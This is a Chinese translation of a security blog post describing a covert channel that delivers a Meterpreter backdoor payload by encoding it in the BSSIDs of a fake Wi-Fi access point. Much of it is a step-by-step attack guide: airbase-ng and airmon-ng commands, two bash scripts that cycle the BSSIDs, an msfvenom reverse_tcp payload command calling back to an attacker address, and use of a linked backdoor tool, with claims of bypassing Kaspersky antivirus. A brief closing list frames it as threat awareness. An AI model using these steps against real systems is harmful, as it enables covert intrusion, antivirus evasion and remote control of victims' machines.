> 原文链接: https://www.anquanke.com//post/id/85745 


# 【技术分享】通过无线流量和BSSID传输后门有效载荷


                                阅读量   
                                **92438**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：peerlyst.com
                                <br>原文地址：[https://www.peerlyst.com/posts/transferring-backdoor-payloads-with-bssid-by-wireless-traffic-damon-mohammadbagher?trk=search_page_search_result](https://www.peerlyst.com/posts/transferring-backdoor-payloads-with-bssid-by-wireless-traffic-damon-mohammadbagher?trk=search_page_search_result)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p3.ssl.qhimg.com/t014490773559372de9.png)](https://p3.ssl.qhimg.com/t014490773559372de9.png)

****

翻译：[金乌实验室](http://bobao.360.cn/member/contribute?uid=2818394007)

稿费：200RMB（不服你也来投稿啊！）

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿

**<br>**

**前言**

在这篇文章中，我想聊一聊无线AP和BSSID（AP的MAC地址）。我们的后门有效载荷没有进行文件系统加密和硬编码，因此我们可以利用这种方法绕过杀毒软件。我们的Meterpreter 有效载荷在网络流量中传输。

在这种情况下，攻击者可以通过篡改BSSID（环路更改，伪造AP）和逐步将后门有效载荷注入到BSSID（伪造的AP的MAC地址）发动攻击。在客户端，被感染的系统（后门系统）可以通过在AIR上扫描AP的MAC地址（BSSID）来转储这些有效载荷，不需要通过user-pass连接到伪造的AP。通过Wifi设备传输有效载荷，例如wlan（无线流量）也在我的讨论范围之内。在AIR上扫描BSSID 转储有效载荷后，Meterpreter会话通过Ethernet Network建立（没有Wifi 或者无线设备）。

恶意软件代码或简单的后门代码可以利用WIFI设备传输或者转储有效载荷，例如Wlan，最后你将得到有简单C＃代码的 meterpreter 会话。

在这篇文章中，我使用Wifi设备仅仅是传输有效载荷（步骤1），通过扫描Wifi设备MAC地址（BSSID） 转储这些有效载荷，然后我的后门将通过eth0或Ethernet卡建立Meterpreter 会话，因此在这个阶段（步骤2），我们使用网络流量来建立Meterpreter 会话，不使用WIFI设备，。

注意：如果你想只通过WIFI设备来完成步骤1和步骤2，我认为技术上是可行的，但是我自己没有测试过。在步骤2中你可能会需要用到EvilTwin AP，还需要使Meterpreter Listener在伪造的AP网络子网中有一个IP地址，你可以使用MANA-Toolkit来完成这个操作。 

链接：[https://github.com/sensepost/mana](https://github.com/sensepost/mana) 

<br>

**这个方法的重点是什么**

重点是：恶意软件或后门有效载荷注入到WiFi设备的BSSID，以及通过无线流量传输是可能的。

<br>

**从伪造的AP扫描注入的有效载荷到BSSID，步骤如下**

例如我们要传输以下的有效载荷：

```
“fec8b00011ddc00945f1”
```

**步骤1：**攻击者系统将伪造的AP命名为“Fake”，MAC地址为00：fe：c8：b0：00：11

注意：Mac地址00：fe：c8：b0：00：11是注入的有效载荷，所以我们的有效载荷是“fec8b00011”,是有效载荷“fec8b00011ddc00945f1”的前半部分。

**步骤2：**后门系统扫描Essid“Fake”并转储BSSID

注意：你的后门代码应该转储这部分的BSSID或Mac地址fe：c8：b0：00：11 ==&gt; fec8b00011

**步骤3：**攻击者系统将伪造的AP命名为“Fake”，Mac地址是00：dd：c0：09：45：f1

注意：Mac地址00：dd：c0：09：45：f1是注入的有效载荷，所以我们的有效载荷是“ddc00945f1”，是有效载荷 “fec8b00011ddc00945f1”的后半部分。

**步骤4：**后门系统扫描Essid“Fake”并转储BSSID

注意：你的后门代码应该转储这部分的BSSID或Mac地址dd：c0：09：45：f1 ==&gt; ddc00945f1

这2步扫描之后，在被感染的系统（后门系统）中你将会得到有效载荷 fec8b00011ddc00945f1。

现在你了解了这种方法的工作原理，接下来我将通过在linux端的命令向你展示（步骤1和步骤3）更多的信息。下面我将通过命令伪造AP。

**可选命令：**在创建Wlan0mon之前更改WiFi卡的TXPower，这些命令可以帮助你更好的伪造AP信号，以便你可以手动操作此命令。



```
ifconfig wlan0 down
iw reg set BO
ifconfig wlan0 up
iwconfig wlan0 txpower 30
```

注意：这些命令在通过airmon-ng创建Wlan0Mon之前就该使用，这些命令是可选的，不是必需的。

<br>

**使用WLAN卡的监控模式是伪造AP的重要步骤**

你可以使用命令“airmon-ng start wlan0”为Wlan0创建“Wlan0Mon”监控模式。

注意：你可以手动运行此命令，或者可以在script1.sh文件中使用此命令，如步骤（cmd 1-1）。在本文中，我在攻击者端手动运行此命令。

**步骤1：**攻击者系统将伪造的AP命名为“Fake”，MAC地址为00：fe：c8：b0：00：11。

注意：Mac地址00：fe：c8：b0：00：11是注入的有效载荷，所以我们的有效载荷是“fec8b00011”

cmd 1-1：airmon-ng start wlan0

注意：创建Wlan0Mon（监控模式）

cmd 1-2：airbase-ng -a 00：fe：c8：b0：00：11 -essid“Fake”-I 10 -0 wlan0mon

注意：你需要15秒伪造AP，15秒后你可以通过killall命令在cmd 1-2终止这个命令。

cmd 1-3：sleep 15

cmd 1-4：killall airbase-ng

**步骤3：**攻击者系统将伪造的AP命名为“Fake”，MAC地址为00：dd：c0：09：45：f1

注意：Mac地址00：dd：c0：09：45：f1是注入的有效载荷，所以我们的有效载荷是“ddc00945f1”

cmd 3-1：airbase-ng -a 00：dd：c0：09：45：f1 -essid“Fake”-I 10 -0 wlan0mon

注意：你需要15秒伪造AP，15秒后你可以通过killall命令在cmd 3-1终止这个命令。cmd 3-2：sleep 15

cmd 3-3：killall airbase-ng

你可以看到在实施这些步骤的时候，我们需要使用以上命令，但是我在airbase-ng命令上遇到了大问题。

<br>

**问题以及解决方案**

问题出现在步骤（cmd 1-2）到（cmd 1-3）。

在步骤（cmd 1-2）之后，只有通过ctrl + c或kill能终止airbaseng命令，所以我的bash脚本总是停在步骤（cmd 1-2），直到我终止了进程。

针对这个问题，我的解决方案是使用2 个bash脚本文件：

第一个bash脚本文件是 “Script1.sh”， 使用于步骤（cmd 1-2和cmd 3-1）

注意：你可以在bash脚本的第一行中添加步骤（cmd 1-1）或手动执行。在本文中，我手动执行cmd 1-1。

第二个bash脚本是 “Script2.sh”，使用于步骤（cmd 1-3 &amp; cmd 1-4 &amp; cmd 3-2 &amp; cmd 3-3）

所以在这种情况下，我们应该首先运行bash脚本“Script1.sh”，然后立即或2-3秒后运行bash脚本“Script2.sh”。

我们得到以下的文件：

Script1.sh文件：



```
＃！/ bin / bash
airbase-ng -a 00：fe：c8：b0：00：11 -essid“Fake”-I 10 -0 wlan0mon;
airbase-ng -a 00：dd：c0：09：45：f1 -essid“Fake”-I 10 -0 wlan0mon;
Script2.sh文件：
#!/bin/bash
sleep 15 ;
killall airbase-ng ;
sleep 15 ;
killall airbase-ng ;
```

注意：你可以在bash脚本“Script2.sh”文件中使用循环命令，例如使用（for）。

如图A所示，我们有script1.sh文件，用于将Meterpreter 有效载荷注入到BSSID。

[![](https://p2.ssl.qhimg.com/t01a9b6dbcf1d2a61c2.png)](https://p2.ssl.qhimg.com/t01a9b6dbcf1d2a61c2.png)

图A

如图A所示，Meterpreter 有效载荷从第3行开始。在本文中我的Meterpreter 有效载荷是510字节。在这种情况下，使用airbase-ng命令可以为名为“Fake”的伪造AP注入5字节的有效载荷到BSSID。因此我们应该有102行用于通过airbase-ng命令将所有的有效载荷注入到BSSID。

102 * 5 = 510字节

注意：每个BSSID包含5个字节的有效载荷。

```
BSSID = 00：fc：48：83：e4：f0
```

`{`5字节`}` ==&gt; fc-48-83-e4-f0

在这种情况下，应将两个BSSID MAC地址添加到script1.sh文件。

如图A所示，我的脚本在第2行有MAC地址00：ff：ff：ff：ff：ff，这个Mac地址或BSSID是启动攻击和传输流量到被感染系统的标志，再如图B所示，此文件应该以BSSID `{`00：ff：00：ff：00：ff`}`结束。



```
BSSID Flag for Start  =  00:ff:ff:ff:ff:ff
BSSID Flag for Finish = 00:ff:00:ff:00:ff
```

BSSID注入循环：改变BSSID（102 + 2）= 104次。

[![](https://p4.ssl.qhimg.com/t01351b470defc57f2d.png)](https://p4.ssl.qhimg.com/t01351b470defc57f2d.png)

图B

如图C所示，可以看到第二个脚本script2.sh文件，在这个文件中可以使用循环命令，例如（For）。

[![](https://p5.ssl.qhimg.com/t016de043bf3535ad0b.png)](https://p5.ssl.qhimg.com/t016de043bf3535ad0b.png)

图C

在 “script2.sh” 文件中，应该至少kill airbase-ng 104次。

<br>

**具体分析**

接下来我要通过我的工具（NativePayload_BSSID.exe）来逐步分析这个方法：

步骤如下：

**步骤0：**创建Wlan0mon（监控模式）。

语法：airmon-ng start wlan0

[![](https://p2.ssl.qhimg.com/t018fdeaf9805e7c342.png)](https://p2.ssl.qhimg.com/t018fdeaf9805e7c342.png)

**步骤1：**使用以下命令生成一个后门有效载荷：

```
msfvenom -a x86_64 --platform windows -p windows / x64 / meterpreter / reverse_tcp lhost = 192.168.1.50 -f c&gt; payload.txt
```

**步骤2：**在payload.txt文件中将有效载荷的格式从“ xfc  x48  x83  xe4”替换为“fc4883e4”。

可以使用这个工具的 “帮助”显示所有的语法，如图1所示：

[![](https://p0.ssl.qhimg.com/t011a8e9978761030c3.png)](https://p0.ssl.qhimg.com/t011a8e9978761030c3.png)

图片1

现在应该复制粘贴有效载荷字符串，通过NULL NativePayload_BSSID，如图1-1所示：

语法：c:&gt; NativePayload.exe null “fc4883e4…”

[![](https://p3.ssl.qhimg.com/t01b18660f41e4ffb61.png)](https://p3.ssl.qhimg.com/t01b18660f41e4ffb61.png)

图1-1

接下来将所有行复制到一个bash脚本，例如“script1.sh”文件。

注意：仅复制粘贴airbase-ng命令行到script1.sh文件。

在这种情况下，这些行应该是102行+2 = 104行。

如图A所示，你应该在脚本的第一行手动添加 “＃！/ bin / bash”，现在在这个文件中应该有105行。

**步骤3：**在Linux端运行Script1.sh。

更改chmod并运行此脚本，如图2所示：

[![](https://p0.ssl.qhimg.com/t01b982a4d153635b32.png)](https://p0.ssl.qhimg.com/t01b982a4d153635b32.png)

图2

步骤4：创建 script2.sh，并更改此脚本的chmod，但是不需要在此步骤中运行这个脚本，如图3所示。

[![](https://p0.ssl.qhimg.com/t01c71618bd1a5f17b5.png)](https://p0.ssl.qhimg.com/t01c71618bd1a5f17b5.png)

图3

注意：应该手动创建bash脚本，如图C所示。

**步骤5：**运行后门，使用NativePayload_BSSID.exe工具，如图4所示，我在kali linux创建了Meterpreter Listener，IPAddress 192-168-1-50，执行了“script1.sh”。

步骤5包含以下步骤：

步骤AA：Meterpreter Listener执行（linux）

步骤BB：script1.sh运行（linux）

步骤CC：后门“NativePayload_BSSID.exe” 运行（Windows）

步骤DD：script2.sh运行（linux）

在步骤CC中，应该使用以下的语法来执行后门NativePayload_BSSID，如图4所示

NativePayload_BSSID.exe “essid”

在本文中，我们在script1.sh中的ESSID是“Fake”，所以正确的语法是：

```
c：&gt; NativePayload_BSSID.exe“Fake”
```

如图4所示，执行步骤（AA，BB和CC）。

[![](https://p0.ssl.qhimg.com/t01e33facd9a88ce29f.png)](https://p0.ssl.qhimg.com/t01e33facd9a88ce29f.png)

图4

如图4所示，由用户“u1”执行后门，接下来应该运行“script2.sh”（步骤DD）。

后门代码试图在AIR上扫描ESSID“Fake”，然后转储BSSID为“Fake”AP，因此如图4所示，我的代码转储4次BSSID“00：ff：ff：ff：ff：ff”，该BSSID是启动攻击和通过BSSID传输有效载荷的标志。

所以在AIR上，我们有以下这些步骤：

[![](https://p5.ssl.qhimg.com/t01f76654fa5eea5211.png)](https://p5.ssl.qhimg.com/t01f76654fa5eea5211.png)

接下来运行script2.sh（步骤DD）。

在运行Script2.sh后，每15秒该脚本将从Script1.sh文件中删除一个Airbase-ng命令。

运行Script2.sh后，在AIR上我们有以下这些步骤：

[![](https://p4.ssl.qhimg.com/t010ef5126b53ff9204.png)](https://p4.ssl.qhimg.com/t010ef5126b53ff9204.png)

如图5所示，我的后门在运行“script2.sh”文件后尝试转储BSSID。

[![](https://p4.ssl.qhimg.com/t01d2f1778e56f3c816.png)](https://p4.ssl.qhimg.com/t01d2f1778e56f3c816.png)

图5：通过BSSID和无线流量传输后门有效载荷

如图6所示，30分钟后你将得到meterpreter 会话。

[![](https://p2.ssl.qhimg.com/t019fb0fc9a1406a37f.png)](https://p2.ssl.qhimg.com/t019fb0fc9a1406a37f.png)

图6

在图中可以看到我们已经通过C＃代码建立了Meterpreter会话，并且我的Kaspersky 2017杀毒软件被这个方法一次又一次地绕过。最终meterpreter会话成功建立了。

注意：在图7中你可以看到我的代码在15秒延迟后建立Meterpreter会话连接，所以如果你使用我的代码验证这个方法，转储所有的有效载荷后，你应该等待15秒，然后你将得到Meterpreter会话。

[![](https://p3.ssl.qhimg.com/t013c0e893dd1dc5676.png)](https://p3.ssl.qhimg.com/t013c0e893dd1dc5676.png)

图7

<br>

**结语**

无线设备总是很容易被攻击，因此我们应该考虑以下威胁：

1. 恶意软件或后门有效载荷注入到WiFi设备的BSSID，以及通过无线流量传输是可能的。

2. 如果你想为你的客户端和网络基础设施使用WIFI设备，你应该考虑这些威胁。

3. 受感染的系统是脆弱的，你的客户端也许会被攻击者攻击。

4. 我的后门试图扫描ESSIDs，例如“Fake”，以转储BSSID，这个流量将会悄悄的工作。

5. 你的杀毒软件无法检测到，而且 LAN / WAN中的防火墙被绕过，因为我们没有任何流量通过这些基础设施。在这种情况下，在AIR上我们在被感染系统Wifi卡和攻击者系统Wifi卡之间有直接流量。在后门转储有效载荷后，我们不使用Wifi卡，而是通过LAN / WAN将Reverse_tcp Meterpreter会话流量从被感染系统传输到攻击者系统。因此在这种情况下，我们在Internet或LAN中有从后门系统到攻击者系统的传出流量，而且这个流量大部分情况下不会被Windows防火墙阻拦。

C＃源代码：[https://github.com/DamonMohammadbagher/NativePayload_BSSID](https://github.com/DamonMohammadbagher/NativePayload_BSSID) 
